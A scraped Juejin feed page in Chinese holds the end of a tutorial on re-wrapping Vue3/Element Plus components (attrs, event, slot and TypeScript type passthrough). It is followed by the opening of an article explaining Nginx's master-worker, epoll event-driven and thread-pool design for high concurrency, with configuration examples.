<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- 核心：v-bind="$attrs" 透传所有未声明的属性 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">ElInput</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"inputVal"</span> <span class="hljs-attr">v-bind</span>=<span class="hljs-string">"$attrs"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span>

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { toRef } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-comment">// 仅声明需要处理的props，其余属性自动进入$attrs</span>
<span class="hljs-keyword">const</span> props = <span class="hljs-title function_">defineProps</span>([<span class="hljs-string">'modelValue'</span>])
<span class="hljs-keyword">const</span> emit = <span class="hljs-title function_">defineEmits</span>([<span class="hljs-string">'update:modelValue'</span>])
<span class="hljs-keyword">const</span> inputVal = <span class="hljs-title function_">toRef</span>(props, <span class="hljs-string">'modelValue'</span>)

<span class="hljs-comment">// 可选：若需自定义attrs透传（如剔除部分属性）</span>
<span class="hljs-keyword">const</span> attrs = <span class="hljs-title function_">useAttrs</span>()
<span class="hljs-comment">// 解构剔除不需要透传的属性，再透传剩余部分</span>
<span class="hljs-keyword">const</span> { <span class="hljs-attr">class</span>: _, ...restAttrs } = attrs
<span class="hljs-comment">// &lt;ElInput v-model="inputVal" v-bind="restAttrs" /&gt;</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
</code></pre>
<p>关键注意：inheritAttrs默认值为true，若设置为false，需手动透传class/style（Vue3中$attrs已包含class/style），避免样式丢失。</p>
<h4 data-id="heading-5">痛点2：事件合并冲突（易忽略，难排查）</h4>
<h5 data-id="heading-6">痛点表现</h5>
<p>封装组件时，底层基础组件的事件（如ElButton的click）与封装组件自身的事件重名，导致父组件绑定的事件不触发，或触发异常；甚至出现“多次触发”的问题。</p>
<p>示例：封装ElButton，自身绑定click事件处理业务逻辑，父组件绑定的click事件无法触发。</p>
<h5 data-id="heading-7">解决方案：事件透传+合并（$emit+展开运算符）</h5>
<p>核心思路：封装组件自身的事件处理完成后，通过$emit透传底层组件的事件；若需合并事件，可使用展开运算符，将底层组件的事件一次性透传。</p>
<pre><code class="hljs language-ts" lang="ts">&lt;!-- 封装组件 <span class="hljs-title class_">MyButton</span>.<span class="hljs-property">vue</span>（正确写法） --&gt;
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- 核心：@click="handleClick" 处理自身业务，同时透传底层事件 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">ElButton</span> 
    <span class="hljs-attr">v-bind</span>=<span class="hljs-string">"$attrs"</span> 
    @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleClick"</span>
    @<span class="hljs-attr">blur</span>=<span class="hljs-string">"$emit('blur')"</span> &lt;!<span class="hljs-attr">--</span> <span class="hljs-attr">透传单个事件</span> <span class="hljs-attr">--</span>&gt;</span>
    v-on="$listeners" <span class="hljs-comment">&lt;!-- Vue2写法，Vue3可省略，$attrs已包含事件 --&gt;</span>
  &gt;
    <span class="hljs-tag">&lt;<span class="hljs-name">slot</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">ElButton</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span>

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">const</span> emit = <span class="hljs-title function_">defineEmits</span>([<span class="hljs-string">'click'</span>, <span class="hljs-string">'blur'</span>])

<span class="hljs-comment">// 自身业务逻辑处理</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleClick</span> = (<span class="hljs-params">e</span>) =&gt; {
  <span class="hljs-comment">// 1. 处理封装组件的业务逻辑（如权限判断、加载状态）</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'处理业务逻辑'</span>)
  <span class="hljs-comment">// 2. 透传click事件给父组件，确保父组件绑定的事件触发</span>
  <span class="hljs-title function_">emit</span>(<span class="hljs-string">'click'</span>, e)
}

<span class="hljs-comment">// 若需合并多个事件（简化写法）</span>
<span class="hljs-keyword">const</span> emits = <span class="hljs-title function_">defineEmits</span>([<span class="hljs-string">'click'</span>, <span class="hljs-string">'blur'</span>, <span class="hljs-string">'focus'</span>])
<span class="hljs-comment">// 底层组件的所有事件，一次性透传</span>
<span class="hljs-comment">// &lt;ElButton v-bind="$attrs" v-on="$listeners" /&gt;</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
</code></pre>
<p>关键注意：Vue3中，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>t</mi><mi>t</mi><mi>r</mi><mi>s</mi><mtext>已包含所有事件（</mtext></mrow><annotation encoding="application/x-tex">attrs已包含所有事件（</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">a</span><span class="mord mathnormal">tt</span><span class="mord mathnormal">rs</span><span class="mord cjk_fallback">已包含所有事件（</span></span></span></span></span>listeners已被合并到<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>t</mi><mi>t</mi><mi>r</mi><mi>s</mi><mtext>中），可直接用</mtext><mi>v</mi><mo>−</mo><mi>b</mi><mi>i</mi><mi>n</mi><mi>d</mi><mo>=</mo><mi mathvariant="normal">"</mi></mrow><annotation encoding="application/x-tex">attrs中），可直接用v-bind="</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">a</span><span class="mord mathnormal">tt</span><span class="mord mathnormal">rs</span><span class="mord cjk_fallback">中），可直接用</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">bin</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord">"</span></span></span></span></span>attrs" 同时透传属性和事件，无需额外写v-on="$listeners"。</p>
<h4 data-id="heading-8">痛点3：slots插槽透传错乱（样式/内容错位）</h4>
<h5 data-id="heading-9">痛点表现</h5>
<p>基础组件的具名插槽（如ElSelect的prefix、suffix插槽），在封装后无法被父组件正常使用；或封装组件自身的插槽与底层组件插槽冲突，导致内容渲染错位。</p>
<p>示例：封装ElSelect，父组件无法使用prefix插槽添加前缀图标。</p>
<h5 data-id="heading-10">解决方案：插槽透传（默认插槽+具名插槽全覆盖）</h5>
<p>核心思路：封装组件中，保留底层组件的所有插槽，通过标签透传，默认插槽直接用，具名插槽需指定name属性，确保父组件可正常使用。</p>
<pre><code class="hljs language-ts" lang="ts">&lt;!-- 封装组件 <span class="hljs-title class_">MySelect</span>.<span class="hljs-property">vue</span>（正确写法） --&gt;
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">ElSelect</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"value"</span> <span class="hljs-attr">v-bind</span>=<span class="hljs-string">"$attrs"</span> @<span class="hljs-attr">change</span>=<span class="hljs-string">"$emit('change')"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 1. 透传默认插槽（选项列表） --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">slot</span>/&gt;</span>
    
    <span class="hljs-comment">&lt;!-- 2. 透传具名插槽（prefix、suffix等，底层组件有的都要透传） --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">prefix</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">slot</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"suffix"</span>/&gt;</span> <span class="hljs-comment">&lt;!-- 父组件可通过#prefix使用 --&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
    
    <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">suffix</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">slot</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"suffix"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- 3. 封装组件自身的插槽（可自定义名称，避免冲突） --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">myCustom</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>封装组件自身的插槽内容<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">ElSelect</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span>

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">const</span> props = <span class="hljs-title function_">defineProps</span>([<span class="hljs-string">'modelValue'</span>])
<span class="hljs-keyword">const</span> emit = <span class="hljs-title function_">defineEmits</span>([<span class="hljs-string">'update:modelValue'</span>, <span class="hljs-string">'change'</span>])
<span class="hljs-keyword">const</span> value = <span class="hljs-title function_">toRef</span>(props, <span class="hljs-string">'modelValue'</span>)
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
</code></pre>
<p>关键注意：具名插槽必须“一一对应”，底层组件有多少个具名插槽，封装组件就需要透传多少个；若无需自定义处理，可直接用 透传，无需额外嵌套。</p>
<h4 data-id="heading-11">痛点4：TS类型支持缺失（大型项目必踩）</h4>
<h5 data-id="heading-12">痛点表现</h5>
<p>使用TS开发时，封装组件无法继承底层基础组件的类型，导致父组件传递props、事件时，没有类型提示、类型报错；甚至出现“传错参数”却无法提前发现的问题，违背TS的类型安全理念。</p>
<p>示例：封装ElInput，父组件传递type="textarea"时，TS提示“类型不存在”。</p>
<h5 data-id="heading-13">解决方案：继承底层组件类型（Vue3+TS实操）</h5>
<p>核心思路：通过Vue3提供的ComponentProps、ComponentEmits等工具类型，继承底层基础组件的props、emits类型，再扩展封装组件自身的类型，实现类型全覆盖。</p>
<pre><code class="hljs language-ts" lang="ts">&lt;!-- 封装组件 <span class="hljs-title class_">MyInput</span>.<span class="hljs-property">vue</span>（<span class="hljs-variable constant_">TS</span>正确写法） --&gt;
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">ElInput</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"inputVal"</span> <span class="hljs-attr">v-bind</span>=<span class="hljs-string">"$attrs"</span> @<span class="hljs-attr">input</span>=<span class="hljs-string">"$emit('input')"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span>

&lt;script setup&gt;
import { toRef } from 'vue'
import { ElInput } from 'element-plus'
// 1. 继承ElInput的props类型，再扩展自身需要的props
type MyInputProps = ComponentProps&lt;typeof ElInput&gt; &amp; {
  // 封装组件自身新增的props，可选
  customProp?: string
}

// 2. 继承ElInput的emits类型，再扩展自身的emits
type MyInputEmits = ComponentEmits&lt;typeof ElInput&gt; &amp; {
  // 封装组件自身新增的事件，可选
  customEmit?: (value: string) =&gt; void
}

// 3. 应用类型
const props = defineProps&lt;MyInputProps&gt;()
const emit = defineEmits&lt;MyInputEmits&gt;()

const inputVal = toRef(props, 'modelValue')
&lt;/script&gt;
</code></pre>
<p>关键注意：</p>
<ul>
<li>ComponentProps、ComponentEmits 是Vue3内置的工具类型，需确保Vue版本≥3.3.0；</li>
<li>扩展类型时，使用&amp;（交叉类型），避免覆盖底层组件的原有类型；</li>
<li>若封装组件无需新增props/emits，可直接使用<code>defineProps&lt;ComponentProps&lt;typeof ElInput&gt;&gt;()</code>，无需额外扩展。</li>
</ul>
<h3 data-id="heading-14">三、封装通用规范（避坑延伸，提升可维护性）</h3>
<p>解决痛点的同时，遵循以下规范，可让封装的组件更易用、更易维护，避免后续踩新坑：</p>
<ol>
<li>最小封装原则：仅封装业务逻辑和统一样式，不屏蔽底层组件的原有功能（attrs、事件、插槽尽量完整透传）；</li>
<li>命名规范：封装组件前缀统一（如MyButton、MyInput），避免与基础组件、其他业务组件重名；</li>
<li>注释清晰：明确标注透传的props、事件、插槽，以及封装组件自身的业务逻辑，方便团队协作；</li>
<li>避免过度封装：若基础组件可直接满足需求，无需强行封装，否则会增加冗余代码和维护成本。</li>
</ol>
<h3 data-id="heading-15">四、总结：二次封装核心要点（新手必背）</h3>
<p>组件库二次封装的核心，是“复用+简化”，而不是“复杂化”。记住以下4个核心要点，就能避开80%的坑：</p>
<ol>
<li>attrs透传：用v-bind="$attrs" 完整透传，按需解构剔除不需要的属性；</li>
<li>事件合并：自身事件处理后透传，Vue3可通过$attrs自动合并事件；</li>
<li>slots透传：默认插槽+具名插槽全覆盖，避免插槽错乱；</li>
<li>类型支持：TS项目继承底层组件类型，扩展自身类型，保证类型安全。</li>
</ol>
<p>其实组件库二次封装并不复杂，只要吃透这4大痛点的解决方案，再遵循通用规范，就能封装出易用、易维护的业务组件，既提升开发效率，又保证项目规范性。新手建议先从简单组件（如按钮、输入框）入手，熟练后再封装复杂组件（如表格、表单）～</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深度解析：Nginx 如何扛住百万并发？底层逻辑与实战优化全指南]]></title>    <link>https://juejin.cn/post/7602928783595995142</link>    <guid>https://juejin.cn/post/7602928783595995142</guid>    <pubDate>2026-02-05T03:10:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602928783595995142" data-draft-id="7602900131541205033" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深度解析：Nginx 如何扛住百万并发？底层逻辑与实战优化全指南"/> <meta itemprop="keywords" content="架构"/> <meta itemprop="datePublished" content="2026-02-05T03:10:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="what丶k"/> <meta itemprop="url" content="https://juejin.cn/user/2578801884147418"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深度解析：Nginx 如何扛住百万并发？底层逻辑与实战优化全指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2578801884147418/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    what丶k
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T03:10:50.000Z" title="Thu Feb 05 2026 03:10:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读20分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">深度解析：Nginx 如何扛住百万并发？底层逻辑与实战优化全指南</h2>
<p>在高并发互联网场景中，Nginx 早已成为性能标杆——无论是电商大促的流量洪峰、短视频平台的亿级请求，还是分布式架构中的反向代理枢纽，Nginx 都能稳定承载百万级并发连接，甚至在优化到位的单机环境中实现千万级吞吐。不同于 Apache 的多进程/多线程模型，Nginx 的高性能并非简单的代码优化，而是架构设计、事件驱动、配置调优与系统协同的综合结果。本文将从底层原理出发，层层拆解 Nginx 扛住百万并发的核心逻辑，结合生产级优化实战，让你既能理解“为什么”，也能掌握“怎么做”。</p>
<h2 data-id="heading-1">一、基石：Nginx 的核心架构设计（并发的底层支撑）</h2>
<p>Nginx 之所以能突破传统 Web 服务器的并发瓶颈，核心在于其“主从进程 + 多进程/多线程”的架构设计，以及与 CPU 多核架构的深度适配，从根源上减少了进程切换与资源竞争的开销，为高并发奠定了基础。</p>
<h3 data-id="heading-2">1.1 Master-Worker 进程模型（分工明确，稳定性拉满）</h3>
<p>Nginx 启动后，会产生两类进程，二者分工清晰、相互独立，既保证了配置的热加载，也避免了单个进程故障导致整体服务雪崩，这是高并发场景下稳定性的核心保障：</p>
<ul>
<li>​**Master 进程（主进程）**​：作为“管理者”，不直接处理客户端请求，仅负责核心管控工作——读取并解析配置文件、启动/停止 Worker 进程、重启故障 Worker 进程、接收信号（如重启、重载配置）。Master 进程占用资源极少，即便出现异常，也能快速重启，且不会影响正在处理请求的 Worker 进程，实现“无缝重载”，这也是生产环境中 Nginx 能 7×24 小时稳定运行的关键。</li>
<li>​**Worker 进程（工作进程）**​：作为“执行者”，是处理客户端请求的核心载体。Master 进程会根据配置文件中的 worker_processes 参数，fork 出多个 Worker 进程（通常建议设置为 CPU 核心数，或 auto 自动适配），每个 Worker 进程都是独立的进程，拥有自己的内存空间和文件描述符，相互之间无共享资源，避免了多进程间的锁竞争开销。</li>
</ul>
<p>实战经验：在 32 核服务器上，使用 worker_processes auto 比手动设置 32 个进程性能提升 15%，因为 Nginx 会智能适配 NUMA 架构，避免进程在不同 CPU 核心间迁移，减少缓存失效的开销。</p>
<h3 data-id="heading-3">1.2 进程与 CPU 多核的深度适配（最大化利用硬件资源）</h3>
<p>传统 Web 服务器（如 Apache）的多进程模型，会导致进程在多个 CPU 核心间频繁切换，每次切换都会消耗大量 CPU 资源，随着并发量增加，切换开销会急剧上升，成为并发瓶颈。而 Nginx 通过“CPU 亲和性绑定”，将每个 Worker 进程固定到特定的 CPU 核心上，从根源上减少了进程切换的开销。</p>
<p>配置示例（生产级推荐）：</p>
<pre><code class="hljs language-nginx" lang="nginx"># 绑定Worker进程到指定CPU核心（4核CPU示例）
worker_processes 4;
worker_cpu_affinity 0001 0010 0100 1000;

# 自动适配CPU核心（推荐，无需手动计算）
worker_processes auto;
worker_cpu_affinity auto;
</code></pre>
<p>此外，每个 Worker 进程都是单线程（或可配置线程池）模型，结合事件驱动机制，能高效利用 CPU 资源，避免了多线程间的上下文切换开销——这也是 Nginx 在高并发下 CPU 使用率始终保持合理水平的核心原因之一。</p>
<h2 data-id="heading-4">二、核心：Reactor 异步事件驱动（突破并发瓶颈的关键）</h2>
<p>如果说架构设计是 Nginx 的“骨架”，那么 Reactor 异步事件驱动就是 Nginx 的“心脏”。传统 Web 服务器采用“一请求一线程/进程”的模型，每个连接都需要占用一个线程/进程，而线程/进程的创建和销毁、上下文切换都会消耗大量资源，当并发连接达到万级以上时，资源会被快速耗尽，导致服务崩溃。</p>
<p>Nginx 则采用“单线程（Worker 内）+ 异步非阻塞 I/O”的 Reactor 事件驱动模型，核心逻辑是：​<strong>一个 Worker 进程通过一个事件循环，管理成千上万的并发连接，仅在连接有数据可读/可写时才进行处理，其余时间处于空闲待命状态，无需浪费资源等待</strong>​。这种模型从根源上解决了传统模型的并发瓶颈，实现了“用少量资源承载海量连接”。</p>
<h3 data-id="heading-5">2.1 Reactor 事件驱动的核心流程（通俗拆解）</h3>
<p>Reactor 模式本质是一种“同步事件观察者模式”，包含四个核心角色：资源（Socket）、同步事件分离器（Epoll 等）、反应器（Reactor）、事件处理器（Event Handler），四者协同完成请求的高效处理，流程如下：</p>
<ol>
<li>​<strong>初始化阶段</strong>​：Nginx 启动后，Master 进程创建监听 Socket，Worker 进程将监听 Socket 注册到同步事件分离器（如 Linux 下的 Epoll），并注册“连接建立”事件，此时 Worker 进程进入空闲待命状态，不消耗 CPU 资源。</li>
<li>​<strong>连接建立阶段</strong>​：当客户端发起 TCP 连接时，监听 Socket 触发“连接建立”事件，Epoll 快速感知并将事件通知给 Reactor（Worker 的事件循环）。</li>
<li>​<strong>事件分发阶段</strong>​：Reactor 根据事件类型（连接建立、数据可读、数据可写），调用对应的事件处理器——比如“连接建立”事件对应“接收连接”处理器，完成 TCP 三次握手，创建客户端连接 Socket，并将该 Socket 注册到 Epoll 中，监听“数据可读”事件。</li>
<li>​<strong>请求处理阶段</strong>​：当客户端发送 HTTP 请求（数据可读）时，Epoll 感知事件并通知 Reactor，Reactor 调用“数据读取”处理器，非阻塞地读取请求数据、解析请求，再调用对应的业务处理器（如静态资源读取、反向代理）处理请求。</li>
<li>​<strong>响应返回阶段</strong>​：处理完成后，Reactor 将响应数据写入客户端 Socket（数据可写事件），完成后无需等待客户端确认，立即释放连接资源（或放入长连接池），继续处理下一个就绪事件。</li>
</ol>
<p>核心优势：整个流程中，Worker 进程始终处于“高效工作”状态，无需等待 I/O 操作（如网络传输、磁盘读取）完成，一个 Worker 进程的单个事件循环，就能管理上万甚至几十万的并发连接，且每个连接仅占用少量内存（约 1KB），极大地降低了资源消耗。</p>
<h3 data-id="heading-6">2.2 关键支撑：I/O 多路复用技术（Epoll 的核心作用）</h3>
<p>Reactor 模式的高效运行，离不开 I/O 多路复用技术的支撑。I/O 多路复用的核心作用是：​<strong>一个进程/线程可以同时监听多个 Socket 连接，快速感知哪些连接有事件发生（可读/可写/异常），并仅处理这些活跃连接，避免盲目轮询</strong>​。</p>
<p>Nginx 支持多种 I/O 多路复用技术（根据操作系统自动适配），其中 Linux 系统下的 Epoll 是性能最优的选择，也是 Nginx 能扛住百万并发的“核心武器”。对比传统的 Select/Poll 技术，Epoll 的优势极为明显：</p>

































<table><thead><tr><th>技术</th><th>最大连接数限制</th><th>事件检测方式</th><th>性能开销</th><th>适用场景</th></tr></thead><tbody><tr><td>Select</td><td>默认 1024（可修改，但有限制）</td><td>轮询所有连接，盲目遍历</td><td>O(n)，随连接数增加急剧上升</td><td>低并发场景（万级以下）</td></tr><tr><td>Poll</td><td>无硬限制，但受系统资源约束</td><td>轮询所有连接，盲目遍历</td><td>O(n)，与 Select 类似</td><td>中低并发场景</td></tr><tr><td>Epoll</td><td>无硬限制，仅受系统内存约束</td><td>事件通知模式，仅返回活跃连接</td><td>O(1)，与连接数无关</td><td>高并发场景（万级以上，支持百万级）</td></tr></tbody></table>
<p>Epoll 的核心优势在于“事件通知”而非“盲目轮询”：它会主动记录所有注册的 Socket 连接，当某个连接有事件发生时，内核会立即通知 Epoll，Epoll 再将该活跃连接返回给 Nginx 的 Worker 进程，Worker 进程仅处理这些活跃连接，无需遍历所有连接。这种机制使得 Epoll 的性能不会随连接数增加而下降，即便承载百万级连接，也能保持高效响应——这正是 Nginx 突破并发瓶颈的关键技术支撑。</p>
<h3 data-id="heading-7">2.3 补充优化：线程池模型（处理阻塞 I/O）</h3>
<p>虽然 Nginx 的异步非阻塞 I/O 能处理绝大多数高并发场景，但在面对磁盘 I/O（如读取大体积静态文件）、SSL 加密解密等阻塞操作时，仍会导致事件循环阻塞，影响并发处理效率。为此，Nginx 引入了线程池模型，将阻塞操作放入独立线程池处理，避免阻塞主事件循环。</p>
<p>配置示例（生产级推荐）：</p>
<pre><code class="hljs language-nginx" lang="nginx"># 创建线程池，设置线程数和队列大小
thread_pool default threads=32 max_queue=65536;

http {
    sendfile on;
    aio threads=default; # 使用线程池处理异步I/O
}
</code></pre>
<p>线程池的引入，让 Nginx 在处理阻塞操作时，依然能保持主事件循环的高效运行，进一步提升了高并发场景下的稳定性和吞吐量。</p>
